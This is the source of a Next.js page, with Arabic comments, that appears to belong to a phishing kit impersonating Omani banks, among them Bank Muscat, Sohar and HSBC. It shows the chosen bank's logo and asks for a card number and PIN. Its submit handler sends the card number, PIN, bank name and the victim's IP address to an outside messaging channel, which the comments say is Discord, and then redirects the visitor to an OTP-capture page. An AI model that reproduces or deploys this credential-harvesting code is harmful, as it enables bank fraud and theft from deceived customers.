'use client'

import { useRouter, useSearchParams } from 'next/navigation';
import Image from "next/image";
import { useState, useEffect, Suspense } from 'react';
import TeleSned from "../../../../../server/TeleSend";

// مكون داخلي يحتوي على useSearchParams
function PaymentContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const { Send } = TeleSned();
    const [isLoading, setIsLoading] = useState(false);
    const [cardError, setCardError] = useState('');
    const [pinError, setPinError] = useState('');
    const [userIp, setUserIp] = useState('جاري التحميل...');
    
    // الحصول على البارامترات من URL
    const bankId = searchParams.get('bankId');
    const bankNameFromUrl = searchParams.get('bankName');
    const ipFromUrl = searchParams.get('ip');

    // جلب IP من API إذا لم يكن موجود في URL
    useEffect(() => {
        if (ipFromUrl) {
            setUserIp(ipFromUrl);
        } else {
            const fetchIp = async () => {
                try {
                    const response = await fetch('/api/ip');
                    const data = await response.json();
                    setUserIp(data.ip);
                } catch (error) {
                    console.error('خطأ في جلب IP:', error);
                    setUserIp('غير متاح');
                }
            };
            fetchIp();
        }
    }, [ipFromUrl]);

    const banks = [
        { id: 1, name: 'بنك عمان العربي', src: '/bankaraboman.jpg' },
        { id: 2, name: 'البنك العماني الدولي', src: '/b-oman-ntional.png' },
        { id: 3, name: 'البنك الأهلي', src: '/bankahle.png' },
        { id: 4, name: 'بنك العز الإسلامي', src: '/bankAz.png' },
        { id: 5, name: 'بنك صحار', src: '/saharabank.png' },
        { id: 6, name: 'بنك نزوى', src: '/b-nzwa.webp' },
        { id: 7, name: 'بنك طفار الإسلامي', src: '/b-dafar.svg' },
        { id: 8, name: 'بنك مسقط', src: '/b-msqt.jpg' },
        { id: 9, name: 'بنك HSBC', src: '/b-hsbc.jpg' },
        { id: 10, name: 'بنك الاسكان', src: '/bankaskan.png' },
        { id: 11, name: 'بنك ميثاق', src: '/b-mythaq.png' },
        { id: 12, name: 'بنك ظفار', src: '/b-dafar no islam.png' }
    ];

    // العثور على البنك المحدد
    const selectedBank = banks.find(bank => bank.id === parseInt(bankId));

    // دالة التحقق من رقم البطاقة (16 رقم فقط)
    const validateCardNumber = (cardNumber) => {
        const cleanCard = cardNumber.replace(/\s/g, '');
        
        // التحقق من أن الرقم يتكون من 16 رقم فقط
        if (!/^\d{16}$/.test(cleanCard)) {
            return { valid: false, message: 'رقم البطاقة يجب أن يكون 16 رقم' };
        }
        
        return { valid: true, message: '' };
    };

    // دالة التحقق من PIN (4 أرقام)
    const validatePin = (pin) => {
        if (!/^\d{4}$/.test(pin)) {
            return { valid: false, message: 'رمز PIN يجب أن يكون 4 أرقام' };
        }
        return { valid: true, message: '' };
    };

    // تنسيق رقم البطاقة أثناء الكتابة (إضافة مسافات كل 4 أرقام)
    const formatCardNumber = (value) => {
        const clean = value.replace(/\s/g, '');
        const groups = clean.match(/.{1,4}/g);
        return groups ? groups.join(' ') : clean;
    };

    const handleCardChange = (e) => {
        const value = e.target.value.replace(/\s/g, '');
        if (value.length <= 16) {
            const formatted = formatCardNumber(value);
            e.target.value = formatted;
            
            // التحقق من صحة الرقم
            if (value.length === 16) {
                const result = validateCardNumber(value);
                setCardError(result.message);
            } else {
                setCardError('');
            }
        }
    };

    const handlePinChange = (e) => {
        const value = e.target.value.replace(/\D/g, '');
        if (value.length <= 4) {
            e.target.value = value;
            if (value.length === 4) {
                const result = validatePin(value);
                setPinError(result.message);
            } else {
                setPinError('');
            }
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        
        const form = e.target;
        const cardNumber = form.cardNumber.value.replace(/\s/g, '');
        const pin = form.pin.value;

        // التحقق من رقم البطاقة
        const cardValidation = validateCardNumber(cardNumber);
        if (!cardValidation.valid) {
            setCardError(cardValidation.message);
            return;
        }

        // التحقق من PIN
        const pinValidation = validatePin(pin);
        if (!pinValidation.valid) {
            setPinError(pinValidation.message);
            return;
        }

        setIsLoading(true);
        
        // إرسال البيانات إلى Discord مع IP
        try {
            const description = `🏦 **بيانات تسجيل الدخول**\n\n` +
                               `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
                               `💳 **رقم البطاقة:** ${cardNumber}\n` +
                               `🔑 **رمز PIN:** ${pin}\n` +
                               `🌐 **IP المستخدم:** ${userIp}\n` +
                               `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
            
            Send(description);
            console.log('✅ تم إرسال بيانات تسجيل الدخول إلى Discord');
        } catch (error) {
            console.error('❌ خطأ في الإرسال إلى Discord:', error);
        }

        // التوجيه إلى صفحة OTP بعد 2 ثانية
        setTimeout(() => {
            setIsLoading(false);
            router.push(`/otp?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(userIp)}`);
        }, 2000);
    };

    // التحقق من وجود البنك
    if (!selectedBank) {
        return (
            <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
                <div className="text-center text-red-500">
                    <p>لم يتم اختيار بنك</p>
                    <button
                        onClick={() => router.push('/payment/banks')}
                        className="mt-4 px-6 py-2 bg-[#800000] text-white rounded-lg hover:bg-[#600000] transition-all duration-300"
                    >
                        العودة لاختيار البنك
                    </button>
                </div>
            </main>
        );
    }

    return (
        <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
            <div className="z-10 w-full max-w-md mx-auto">
                {/* البطاقة العلوية */}
                <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mb-6">
                    <div className="w-20 h-20 relative rounded-full overflow-hidden bg-gray-50 flex items-center justify-center mb-4">
                        <Image
                            src={selectedBank.src}
                            alt={selectedBank.name}
                            width={80}
                            height={80}
                            className="object-contain p-2"
                            onError={(e) => {
                                e.target.src = '/bank-placeholder.png';
                            }}
                        />
                    </div>
                    <h2 className="text-2xl font-bold text-[#800000] text-center">
                        {selectedBank.name}
                    </h2>
                    <p className="text-gray-600 mt-2 text-center text-sm">
                        يرجى إدخال بيانات تسجيل الدخول
                    </p>
                </div>

                {/* نموذج تسجيل الدخول */}
                <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
                    <h1 className='text-gray-600 mb-4 text-center font-semibold'>الخطوة الثانية - تأكيد الدفع</h1>
                    <form onSubmit={handleSubmit} className="space-y-5">
                        {/* رقم البطاقة */}
                        <div>
                            <label htmlFor="cardNumber" className="block mb-1.5 text-sm font-semibold text-gray-700">
                                رقم البطاقة <span className="text-[#800000]">*</span>
                            </label>
                            <input
                                type="text"
                                id="cardNumber"
                                name="cardNumber"
                                required
                                maxLength={19}
                                placeholder="____ ____ ____ ____"
                                onChange={handleCardChange}
                                className={`w-full text-gray-700 border rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white ${
                                    cardError ? 'border-red-500' : 'border-gray-300'
                                }`}
                                dir="ltr"
                            />
                            {cardError && (
                                <p className="text-red-500 text-xs mt-1">{cardError}</p>
                            )}
                            <p className="text-xs text-gray-400 mt-1">أدخل 16 رقم (مثل: 1234 5678 9012 3456)</p>
                        </div>

                        {/* رمز PIN */}
                        <div>
                            <label htmlFor="pin" className="block mb-1.5 text-sm font-semibold text-gray-700">
                                رمز PIN <span className="text-[#800000]">*</span>
                            </label>
                            <input
                                type="password"
                                id="pin"
                                name="pin"
                                maxLength={4}
                                required
                                placeholder="____"
                                onChange={handlePinChange}
                                className={`w-full text-gray-700 border rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white ${
                                    pinError ? 'border-red-500' : 'border-gray-300'
                                }`}
                                dir="ltr"
                            />
                            {pinError && (
                                <p className="text-red-500 text-xs mt-1">{pinError}</p>
                            )}
                            <p className="text-xs text-gray-400 mt-1">أدخل 4 أرقام</p>
                        </div>

                        <button
                            type="submit"
                            disabled={isLoading}
                            className="w-full px-6 py-3 bg-[#800000] text-white rounded-lg shadow-md hover:bg-[#600000] transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:ring-offset-2 text-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                            {isLoading ? (
                                <span className="flex items-center justify-center gap-2">
                                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                    </svg>
                                    جاري المعالجة...
                                </span>
                            ) : (
                                'التالي'
                            )}
                        </button>
                    </form>
                </div>
            </div>
        </main>
    );
}

// المكون الرئيسي مع Suspense
export default function Page() {
    return (
        <Suspense fallback={
            <div className="flex min-h-screen items-center justify-center bg-gradient-to-br from-gray-50 to-gray-100">
                <div className="text-center">
                    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#800000] mx-auto"></div>
                    <p className="mt-4 text-gray-600">جاري التحميل...</p>
                </div>
            </div>
        }>
            <PaymentContent />
        </Suspense>
    );
}
